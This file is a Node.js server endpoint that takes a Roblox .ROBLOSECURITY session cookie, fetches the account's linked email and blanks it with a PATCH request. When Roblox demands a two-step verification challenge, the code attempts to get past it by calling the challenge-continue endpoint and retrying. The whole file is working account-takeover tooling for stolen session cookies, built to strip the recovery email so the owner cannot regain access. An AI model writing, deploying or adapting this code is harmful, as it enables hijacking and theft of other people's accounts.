const https = require("https");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.writeHead(405, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Only POST allowed" }));
  }

  let cookie = req.body.cookie;
  if (!cookie) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
  }

  cookie = cookie.trim();
  if (cookie.includes(".ROBLOSECURITY=")) {
    cookie = cookie.split(".ROBLOSECURITY=")[1];
  }

  if (cookie.length < 50) {
    res.writeHead(400, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" }));
  }

  try {
    console.log("🔑 Getting CSRF token...");
    const csrfToken = await getCsrfToken(cookie);
    console.log("✅ CSRF token:", csrfToken);

    console.log("📧 Fetching email info...");
    const emailInfo = await fetchEmail(cookie, csrfToken);
    console.log("📬 Email info:", emailInfo);

    if (!emailInfo || (!emailInfo.emailId && !emailInfo.emailAddress)) {
      res.writeHead(400, { "Content-Type": "application/json" });
      return res.end(JSON.stringify({
        error: "No linked email or invalid response",
        debug: emailInfo,
      }));
    }

    const emailToDelete = emailInfo.emailId || emailInfo.emailAddress;
    console.log("🗑️ Attempting to delete email:", emailToDelete);

    let result = await deleteEmail(cookie, csrfToken, emailToDelete);

    if (result && result.needsChallenge) {
      console.log("⚠️ Challenge required. Continuing challenge...");
      const challengeResult = await continueChallenge(
        cookie,
        csrfToken,
        result.realChallengeId,
        result.challengeMetadata
      );

      if (challengeResult.success) {
        console.log("✅ Challenge passed. Retrying email delete...");
        result = await deleteEmail(cookie, csrfToken, emailToDelete, result.realChallengeId);
      } else {
        console.log("❌ Challenge failed:", challengeResult);
        res.writeHead(403, { "Content-Type": "application/json" });
        return res.end(JSON.stringify({
          error: "Challenge continuation failed",
          challenge: challengeResult,
        }));
      }
    }

    if (result && result.errors && result.errors.length > 0) {
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(JSON.stringify({
        error: result.errors[0].message || "Challenge required",
        code: result.errors[0].code,
      }));
    }

    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({
      success: true,
      result,
    }));
  } catch (err) {
    console.error("❌ Server error:", err);
    res.writeHead(500, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ error: err.message }));
  }
};

function getCsrfToken(cookie) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      method: "POST",
      hostname: "auth.roblox.com",
      path: "/v2/logout",
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    }, (res) => {
      const token = res.headers["x-csrf-token"];
      if (token) return resolve(token);
      reject(new Error("CSRF token not found in headers"));
    });

    req.on("error", reject);
    req.end();
  });
}

function fetchEmail(cookie, csrfToken) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      method: "GET",
      hostname: "accountsettings.roblox.com",
      path: "/v1/email",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken,
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    }, (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch {
          reject(new Error("Invalid JSON in fetchEmail: " + data));
        }
      });
    });

    req.on("error", reject);
    req.end();
  });
}

function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify({ emailAddress: "" });

    const headers = {
      Cookie: `.ROBLOSECURITY=${cookie}`,
      "X-CSRF-TOKEN": csrfToken,
      "Content-Type": "application/json",
      Accept: "application/json",
      "Content-Length": Buffer.byteLength(payload),
      "User-Agent": "Mozilla/5.0"
    };

    if (challengeId) {
      headers["rblx-challenge-id"] = challengeId;
      headers["rblx-challenge-type"] = "twostepverification";
      headers["rblx-challenge-metadata"] = "{}";
    }

    const req = https.request({
      method: "PATCH",
      hostname: "accountsettings.roblox.com",
      path: "/v1/email",
      headers
    }, (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => {
        try {
          const parsed = data ? JSON.parse(data) : {};
          if (res.statusCode === 403 && parsed.errors) {
            const headerChallengeId = res.headers["rblx-challenge-id"];
            const challengeType = res.headers["rblx-challenge-type"];
            const challengeMetadata = res.headers["rblx-challenge-metadata"];
            if (headerChallengeId && challengeType) {
              return resolve({
                needsChallenge: true,
                realChallengeId: headerChallengeId,
                challengeType,
                challengeMetadata
              });
            }
          }
          resolve(parsed);
        } catch {
          resolve({ success: res.statusCode === 204 || res.statusCode === 200 });
        }
      });
    });

    req.on("error", reject);
    req.write(payload);
    req.end();
  });
}

function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify({
      challengeId,
      challengeMetadata
    });

    const req = https.request({
      method: "POST",
      hostname: "apis.roblox.com",
      path: "/challenge/v1/continue",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken,
        "Content-Type": "application/json",
        Accept: "application/json",
        "Content-Length": Buffer.byteLength(payload),
        "User-Agent": "Mozilla/5.0"
      }
    }, (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => {
        try {
          const parsed = data ? JSON.parse(data) : {};
          resolve({
            success: res.statusCode === 200 || res.statusCode === 204,
            data: parsed
          });
        } catch {
          resolve({ success: false, error: "Invalid challenge JSON: " + data });
        }
      });
    });

    req.on("error", reject);
    req.write(payload);
    req.end();
  });
                  }
